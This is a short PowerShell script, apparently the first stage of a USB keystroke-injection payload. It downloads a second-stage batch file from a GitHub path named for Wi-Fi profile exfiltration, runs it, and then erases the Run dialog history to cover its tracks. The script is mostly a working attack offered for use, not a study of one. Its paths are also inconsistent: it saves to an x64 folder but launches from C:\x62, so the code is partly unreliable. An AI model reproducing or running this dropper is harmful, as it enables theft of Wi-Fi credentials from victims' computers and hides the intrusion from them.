cd /;mkdir x64;cd x64;
wget https://raw.githubusercontent.com/s3luX/RDucky_payloads/main/wifi_profiles_exfil/stage_2.bat -OutFile stage2.bat
start C:\x62\stage2.bat
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit
